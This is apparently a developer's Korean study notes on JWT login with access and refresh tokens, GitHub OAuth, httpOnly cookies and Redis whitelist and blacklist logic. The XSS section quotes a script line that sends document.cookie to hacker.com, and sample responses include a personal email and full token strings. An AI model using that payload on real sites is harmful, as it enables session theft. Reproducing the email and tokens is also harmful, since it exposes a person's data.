---  
category: Project/인증 및 인가  
share: true  
---  
  
  
  
# 로그인 구현 관련 정리하기  
  
[Notion – The all-in-one workspace for your notes, tasks, wikis, and databases.](https://jujubebat.notion.site/JWT-Refresh-768b457137a34a0395577df953416f55)  
[Fetching Title#k7v5](https://www.popit.kr/jwt-%EC%9D%B8%EC%A6%9D%EC%9D%80-%EB%AC%B4%EC%97%87%EC%9D%B4%EA%B3%A0-%EC%96%B4%EB%96%BB%EA%B2%8C-%EC%82%AC%EC%9A%A9%ED%95%B4%EC%95%BC-%ED%95%A0%EA%B9%8C/)  
[Prolog](https://prolog.techcourse.co.kr/studylogs/2272)  
[JWT Bearer Flow | Cloud Sundial](https://cloudsundial.com/salesforce-identity/jwt-bearer)  
  
![Pasted image 20230201134225.png](../../attachments/Pasted%20image%2020230201134225.png)  
  
JWT를 더 안전하게 저장하기  
백엔드 → 로그인 시 인증 서버로부터 access token, refresh token을 받아온다.  
  
프론트엔드 → access token은 메모리(변수)에 저장한다.  
  
백엔드 → refresh token은 쿠키에 저장하여 httpOnly / secure / SameSite(Strict or Lax 모드) 옵션을 지정한다. (백엔드)  
  
프론트엔드 → 권한이 필요한 요청 시 Authorization 헤더에 access token을 보내준다.  
  
백엔드 & 프론트엔드 → access token이 만료되었거나, 페이지 이동으로 사라졌을 시, 서버 렌더링 과정 혹은 API 통신을 통해 재발급을 요청한다.  
→ 이때, 요청 시 쿠키에는 자바스크립트에서 접근이 불가능한(httpOnly 옵션) refresh token이 이미 담겨진 상태로 서버와 통신하게 된다.  
  
백엔드 → refresh token이 만료되었을 때 DB와 다시 한번 통신하여 갱신 혹은 로그아웃 상태로 렌더링을 하여준다.  
  
프론트엔드 역할  
github OAuth 서버로 github 로그인 요청 후, Authorization code 발급 받아, 백엔드에 전달  
백엔드에서 응답 받은 access token, refresh token 저장해두기  
권한이 필요한 요청마다 Authorization 헤더에 access token 같이 보내주기  
access token이 만료되었다면, refresh token 보내서 갱신하기(프론트에서 요청 날릴 때 access token이 만료됨을 미리 판별하여 갱신 요청을 보낼 수 있음)  
refresh token 만료 기간이 7일 이내면, refresh token 재발급 요청  
백엔드 역할  
Authorization code로 github OAuth 서버에 토큰 요청  
(로그인 할 때 이외에 OAuth 서버와 통신이 필요한 경우 발급 받은 토큰 저장해야 할듯)  
Access token으로 이름, 이메일, 프로필 URL 정보 요청  
db에 존재하지 않는 유저라면, 새로 등록. db에 존재하는 유저라면 정보 업데이트  
유저의 primary key 값으로 JWT 토큰(access token & refresh token) 생성. 일반적으로 access token은 한 시간, refresh token은 2주로 생성(본인 애플리케이션에 맞게 변경하여 사용)  
refresh token은 DB나 Redis에 저장  
유저 정보, access token, refresh token 프론트로 전달  
access token 만료시 refresh token 검증 후, 재발급  
  
  
  
Refresh Token을 사용하게 되면 토큰 탈취를 당했을 때 해당 Refresh Token을 관리자가 무효화 처리를 시키면 Access Token 재발급 강제적으로 막을 수도 있습니다.  
  
이런 이유 이외에 다음에 설명할 토큰 탈취를 어렵게 하기 위해 Access Token 저장소를 브라우저의 메모리(자바스크립트 변수)에 저장하게 하는데 이때 브라우저를 리로드 하거나, 페이지 이동을 하게 되면 Access Token이 없어져 재 발급 받아야 하는 상황이 발생하게 됩니다. 이런 경우에도 Refresh Token을 이용하여 Access Token을 재발급 받을 수 있기 때문에 Access Token 저장소를 자유롭게 선택할 수 있는 장점이 있습니다.  
  
  
  
토큰 탈취 관련  
일반적인 상황에서는 토큰 또는 세선의 탈취가 어렵겠지만 해커는 다양한 방법으로 세션을 탈취를 시도합니다. 토큰 탈취를 이해하기 위해서는  XSS(Cross-site scripting) 와 CSRF(Cross-Site Request Forgery)에 대한 이해가 필요합니다.  
  
XSS(Cross Site Scripting)  
XSS 공격을 통해 브라우저의 로컬 스토리지나 쿠키 정보를 해커 사이트로 보낼 수 있다.  
해커는 해당 사이트에서 제공하는 댓글달기, 글쓰기 등을 화면애서 다음과 같은 게시글을 등록한다.  
 ```  
<script>document.location = ‘http://hacker.com/cookie?’+document.cookie</script>  
```  
로그인한 사용자가 이 글을 조회할 경우 세션ID 값이 해커 사이트로 전송된다.  
해커는 이 토큰을 활용해서 해당 사용자로 위장하는 경우가 발생할 수 있다.  
이런 공격은 사이트에서 사용자 작성 글에 대해 스크립트를 실행 가능한 상태로 노출하는 경우에 발생한다.  
최근에는 사이트의 보안 수준이 높아져서 사용자가 입력한 스크립트 포함된 글에 대해서 보안 방지 처리를 하고 있다.  
CSRF(Cross-Site Request Forgery)  
악성 게시글을 등록하는 것은 동일하나 그 내용이 해커 사이트로 토큰을 탈취하는 것이 아니라 현재 사용중인 사용자가 다른 액션을 처리하게 하는 행위이다.  
현재 사용자가 로그인된 사이트로 사용자가 의도하지 않은 DELETE, PUT, POST 등의 액션을 보내 주문취소, 자동주문 등을 실행하게 할 수 있다.  
  
어디에 저장할 것이냐  
![Pasted image 20230201133756.png](../../attachments/Pasted%20image%2020230201133756.png)  
  
위와 같이 Acess Token을 변수에 저장하는 경우 페이지를 강제 리로딩 하거나 다른 탭에서 동일 페이지를 열 경우 이미 인증 되었음에도 불구하고 Access Token이 없기 때문에 문제가 발생할 수 있습니다. 이런 문제를 해결하기 위해서 모든 요청에 대해 Access Token이 없거나, 만료된 경우 Refresh Token을 이용하여 Access Token을 재발급 받는 로직이 추가 되어야 합니다.  
  
다행히 axios 등과 같이 API를 요청하는 프레임워크 들은 모든 요청에 대해 hook을 설정할 수 있는 기능을 제공하고 있습니다. 이 기능을 사용하여 한번 설정하면 모든 요청에 인증 관련 처리를 할 수 있습니다. 다음은 필자가 사용하는 서비스에서 사용중인 코드입니다.  
  
Refresh 토큰을 브라우저 쿠키에 보관하는 경우 HTTP Request 에 쿠키 값을 함께 전달해야 합니다. 쿠키 값을 함께 전달하기 위해서는 Axios 를 사용하는 경우 아래 처럼 withCredentials 옵션을 true 로 설정해야 합니다.  
  
  
  
[JWT Authentication in NestJS — Refresh JWT with Cookie-based Token | by Jen-Hsuan Hsieh (Sean) | A Layman | Dec, 2022 | Medium](https://medium.com/a-layman/jwt-authentication-in-nestjs-refresh-jwt-with-cookie-based-token-2f6b860f7d67)  
  
  
  
- 로그인 고도화 해보기  
[Maximize Code Security in Your NestJS Applications (Part 2) | by Sunny Sun | Dec, 2022 | Level Up Coding](https://medium.com/gitconnected/maximize-code-security-in-your-nestjs-applications-part-2-be707466b7ea)  
  
DB 덜찌르려고 userId 만 반환하게 했는데  
이게  
릴레이션 설정하니까 유저 객체가 항상 필요하네...  
  
아닌가... ㅠㅠ 일단 로그인 구현 좀 더 해봐야함 ㅠㅠ  
  
  
```json  
{  
	"user": {  
		"id": "58eecdc0-e671-420c-bbd5-135e5d12c971",  
		"email": "bori12370@gmail.com",  
		"username": "박 소현                                              ",  
		"createdAt": "2023-02-07T08:13:31.709Z",  
		"updatedAt": "2023-02-07T08:13:31.709Z",  
		"deletedAt": null  
	},  
	"refreshToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI1OGVlY2RjMC1lNjcxLTQyMGMtYmJkNS0xMzVlNWQxMmM5NzEiLCJ0b2tlblR5cGUiOiJyZWZyZXNoIiwiaWF0IjoxNjc1ODQxMDQ0LCJleHAiOjIyODA2NDEwNDQsImp0aSI6IjJjYmU0MzMxLWFmM2QtNDc3Zi04NDNmLWMyNGMwMzY1NmYyZiJ9.kmZ1naIkueRan7y6oCbln63Wcdt-td4hDvHTieLC7gM",  
	"accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI1OGVlY2RjMC1lNjcxLTQyMGMtYmJkNS0xMzVlNWQxMmM5NzEiLCJyZWZyZXNoVG9rZW5JZCI6IjJjYmU0MzMxLWFmM2QtNDc3Zi04NDNmLWMyNGMwMzY1NmYyZiIsInRva2VuVHlwZSI6ImFjY2VzcyIsImlhdCI6MTY3NTg0MTA0NCwiZXhwIjoxNjc1ODcxMDQ0LCJqdGkiOiJjN2Q1NDFkOC0zMDNlLTQ4ODgtODE2Mi0wMDkzYzc0ZjJhYTUifQ.J-8edZNkgHkTS3-LPXV9HAxtTDKRC1mQNz_XHVv130s",  
	"message": "login success"  
}  
```  
  
  
INSERT INTO "housekeeping"."task"  
("creator_user_id", "assignee_user_id", "assigner_user_id", "housework_id", "is_completed", "created_at", "updated_at", "deleted_at")   
  
VALUES  
  
($1, DEFAULT, DEFAULT, $2, $3, DEFAULT, DEFAULT, DEFAULT) RETURNING "id", "created_at", "updated_at", "deleted_at"   
  
  
-- PARAMETERS: ["58eecdc0-e671-420c-bbd5-135e5d12c971",2,false]  
  
  
  
[Fetching Title#p85r](https://supertokens.com/blog/revoking-access-with-a-jwt-blacklist)  
  
# Goals  
Access & Refresh Token 에 대한이해  
JWT 인증에 대한 단점에 대한 이해  
$\quad$ 토큰 취소  
$\quad$ 토큰 보관 보안성  
JWT 인증   
# Introduction  
  
[TheKenyanDev: Access & Refresh Tokens - A Deep Dive into the JWT Authentication Flow By Building an Authentication System with NodeJS & Redis](https://thekenyandev.com/blog/jwt-access-&-refresh-tokens-building-a-somewhat-stateless-jwt-authentication-system-with-nodejs-redis-and-react-part-one-server/#updates)  
  
  
[https://github.dev/Bradleykingz/jwt-access-and-refresh-tokens-nodejs-template](https://github.dev/Bradleykingz/jwt-access-and-refresh-tokens-nodejs-template)  
  
[How to implement refresh tokens JWT in NestJS Part-1 – @tkssharma | Tarun Sharma | My Profile](https://tkssharma.com/implement-refresh-token-in-nestjs-apis-part-1/)  
  
![Pasted image 20230119121346.png](../../attachments/Pasted%20image%2020230119121346.png)  
  
  
# Payload  
- login 이후 반환되는 payload 값  
```json  
{  
	"user": {  
		"id": "f0c9ad9e-8e85-11ed-93a9-de361dafd48a",  
		"email": "bori12370@gmail.com",  
		"username": "아무개",  
		"createdAt": "2023-01-07T12:22:23.973Z",  
		"updatedAt": "2023-01-08T11:08:31.077Z"  
	},  
	"message": "already signed in user and login successful",  
	"tokens": {  
		"accessToken": {  
			"token": "asdf",  
			"jti": "36e47034-f814-41cf-8883-053c3bae3b8a"  
		},  
		"refreshToken": {  
			"token": "qwer",  
			"jti": "6e4d5224-20ae-420f-a4c1-7fe0b9eb3b31"  
		}  
	}  
  
}  
```  
  
  
- access token payload   
```json  
{  
  "email": "test@abvadf.com",  
  "userId": "f0c9ad9e-8e85-11ed-93a9-de361dafd48a",  
  "refreshTokenId": "6e4d5224-20ae-420f-a4c1-7fe0b9eb3b31",  
  "tokenType": "access",  
  "iat": 1673425790,  
  "exp": 1675225790,  
  "aud": [  
    "http://localhost:3000"  
  ],  
  "iss": "dorito",  
  "jti": "36e47034-f814-41cf-8883-053c3bae3b8a"  
}  
```  
  
  
- refresh token payload  
```json  
{  
  "userId": "f0c9ad9e-8e85-11ed-93a9-de361dafd48a",  
  "tokenType": "refresh",  
  "iat": 1673425790,  
  "exp": 2278225790,  
  "aud": [  
    "http://localhost:3000"  
  ],  
  "iss": "dorito",  
  "jti": "6e4d5224-20ae-420f-a4c1-7fe0b9eb3b31"  
}  
```  
  
v  
# 로직  
  
 1. Access, Refresh 둘다 `jti` (토큰 고유 Id, uuid로 생성) 을 가지고 있다.   
 2. Access 에는 발급할 때 함께 생성된 refresh token 의 jti 를 가지고 있다. (`refreshTokenId`)  
 3. Access 재발급 시 해당 refresh token가 유효한지 검증  
    - access 토큰의 refreshTokenId 와 해당 refresh 토큰의 jti 와 일치하는 지 확인  
    -  토큰들 모두 secret 키로 유효성 검증  
    - isValid = true 인지 확인 (가장 최근에 발급한 토큰만 사용할 수 있게 하기 위함, 이전에 발급했던 토큰들은 만료되기 false 타입으로 저장)  
되는 토큰만 저장...  
  
- 화이트 리스트?   
[^e34c97](WIP)%20%EB%A1%9C%EA%B7%B8%EC%9D%B8%20%EA%B5%AC%ED%98%84%20%EC%B5%9C%EC%A2%85%20%EC%A0%95%EB%A6%AC.md#^e34c97)  
  
블랙리스트로 저장) 안되는 토큰들 저장함: 액세스토큰  
화이트리스트) 되는 토큰들 저장함: 리프레시토큰  
  
옵션: 도커 띄워서 redis 가상 테스트 환경 만들기 (2시간 내에 감 안오면 하지마)  
무조건: 허스키 → 커밋하기 전에 테스트 돌려서 테스트 실패하면 커밋 못하게 막는거 써보기   
  
  
- 로직 수정  
1. Access, Refresh 둘다 `jti` (토큰 고유 Id, uuid로 생성) 을 가지고 있다.   
2. Access 에는 발급할 때 함께 생성된 refresh token 의 `jti` 를 가지고 있다. (`refreshTokenId`)  
3. 토큰 발급 시 **레디스에 Refresh 토큰만 저장** (화이트리스트)  
4. 토큰 재발급  
   Access 재발급 시 해당 refresh token가 유효한지 검증  
    - access 토큰의 **refreshTokenId** 와 해당 refresh 토큰의 **jti 와 일치**하는 지 확인  
    -  토큰들 모두 **secret 키**로 유효성 검증  
    - 기존 access 토큰 (블랙리스트)  
        - **레디스에 존재**하는 경우 인증 오류 발생  
        - 레디스에 존재하지 않는 경우 **레디스에 저장**한다   
    - 기존 refresh 토큰 (화이트리스트)  
        - 레디스에 **존재하지 않는 경우** 인증 오류 발생  
        - 존재한다면, **레디스에서 삭제**   
    - 재발급한 refresh 토큰만 redis에 저장한다.  
5. 토큰 삭제 (로그아웃)  
   `KEYS user:대충아이디:accessToken:*` 하면 모든 토큰에 대한 키가 나와서 일괄 처리  
  
레디스 저장 양식  
userId: asdf - tokenjti: asdf  
  
`Key` user:대충아이디:accessTokenJti:대충토큰 `Value` false  
`Key` user:대충아이디:refreshTokenJti:대충토큰 `Value` true  
  
  
  
  
  
https://dorito.netlify.app/attachments/Pasted%20image%2020230116121553.png  
  
